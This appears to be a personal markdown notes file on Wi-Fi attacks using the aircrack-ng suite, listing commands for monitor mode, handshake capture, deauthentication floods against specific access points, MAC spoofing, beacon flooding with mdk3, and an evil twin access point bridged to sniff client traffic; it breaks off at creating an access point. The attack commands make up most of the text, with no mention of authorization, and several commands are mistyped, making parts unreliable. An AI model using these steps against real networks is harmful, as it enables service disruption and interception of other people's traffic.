# wifi-hking


# AirCrack-Ng Tool
- Aircrak-ng is not a signle tool, but  rather a suit of tools for manipu;ating and craking wifi networks
    
    - Airmon-ng
          
          - Placing different cards in monitor mode.
    - aircrack-nh
          
          - Wireless key cracking program
     - aurodump-ng
     
            - Packet sniffer

     - aireplay-ng
     
            - Packet injector
     - airbase-ng 
    
           - config dake access points
    
     - airdecap-ng 


            - decrypt WEP/WPA/WPA2 encryption

## Packet Injection

 <P> Packet injection allow to intercept, disrupt and manipulate netwoek communication.
  packet injection is commonly used in man-in-the-middle attacks
  
  An example of this is sending a deautentication packets from an unknown party outside the network to a connected client as
  id it as  send by the wireless router. This will result in the client disconnecting from the router.
  </P>
  
  ### Recommended use wireless cards
    - ALFA AWUS06H
    - TP-LINK WN722N
    - ALFA AWUS036NHA
  
  ### To test network adopter for packet injection
  ```bash
  aireplay-ng -9 wlx
  ```
  
  ### Put wireless card in monitor mode
  ```bash
  sudo airmon-ng start wlx
  ```
  - To kill the process 
  ```
  airmon-ng check kill
  ```
  - To check the monitor mode
  ```
  iwconfig
  ```
- To list the wireless network arround you
```bash
airodump-ng wlx
```
- TO crak a specific network
```
└──╼ #airodump-ng -c 7 --bssid 28:DE:E5:BA:BC:C8 wlx502b73a0015b
```
- Force client to dissconnect
```
└──╼ #aireplay-ng -0 20 -a 28:DE:E5:BA:BC:C8 wlx502b73a0015b
```
--------------------------------------------------------------------

# MAC Spoofing 

- Before changing mac address you should always put you network adopter down

```bash
ifconfig wlan0 down
```
```bash
└──╼ #macchanger -r wlx5
```
 - Spoof a specific mac address
 ```bash
macchanger -m 50:2b:73:a0:01:5b wlx
```
- Bring the network adopter up 
```bash
└──╼ #ifconfig wlx up
```
-----------------------------------------------------------------------------

# Dos Attack

Start monitor mode
```bash
└──╼ #airmon-ng start wlx5
```
Scan All the access points
```bash
└──╼ #airodump-ng wlx5
```
show the clients connect to the network
```bash
└──╼ #airodump-ng -c 7 --bssid 28:DE:E5:BA:BC:C8  wlx
```
To dos attack || Send packs
```bash
└──╼ #aireplay-ng -0 1000 -a 28:DE:E5:BA:BC:C8 wlx502b73a0015b

```
Fake flood wireless networks
```bash
mdk3 walan0man b -c 5
```
-------------------------------------------------------------------------------

# Evil Twin Attack

Evil twin is local fake assess point

## Monitor mode
```bash
sudo airmon-ng start wlan0mon

```
## Scan all the wireless access points

```bash
sudo airodump-ng wlan0mon

```
## Find the assessing point you want to clone

### Create a fake assessing point 
```bash
airbase-ng -a  50:1D:93:98:0F:BC -e Ansari -c 10  wlan0mon
```

### forcing client to disconnect & connect to the fake asses point
```
airplay-ng -0 0 -a 60:F6:77:82:7B:BB wlan0mon
```
### giving hotspot from the fake assess point 
```bash
apt-get insall bridge-utils
```
### after installaton
```
brctl addbr fake
# creating bridge between etho and fake
brctl addif fake eth0

# Adding interface which is created by airbase-ng
brctl addif fake at0
# Adding ip addresses to interdaces
ifconfig at0 0.0.0.0 up
ifconfig fake up

```
## you can listen to fake traffic using wireshark

___________________________________________________________________________
# Advance Evil twin attack!!

<h3> Put wireless card in monitor mode </h3>

```bash
airmon-ng start wlam0
```
 
  ### Testing the packet injection 
  
  ```bash
  aireplay-ng --test wlan0mon
  ```
  ### sniffing wireless network
   #### Scanning all the networks avalible
  
  ```bash
  airodump-ng wlan0mon
  ```
  ### sniff packs 
  
  ```bash
  airodump-ng --bassid 04:B0:E7:EC:34:24 -c 6 -w capture wlan0mon
  # this will start capturing packs in folder called capture
  ```
  
  ### inject packets in target network 
  ```bash
  aireplay-ng --deauth 10 -a 04:B0:E7:EC:34:24 wlan0mon
  ```
  ### To see the packets captured
  ```bash
  wireshark capture.cap
  ```
  
  # Setp 1 Create access point
  
  
  - Install dnsmasq hostapd
  
  ```
        apt install dnsmasq hostapd
  ```     
  
  
  
  
  




  
    
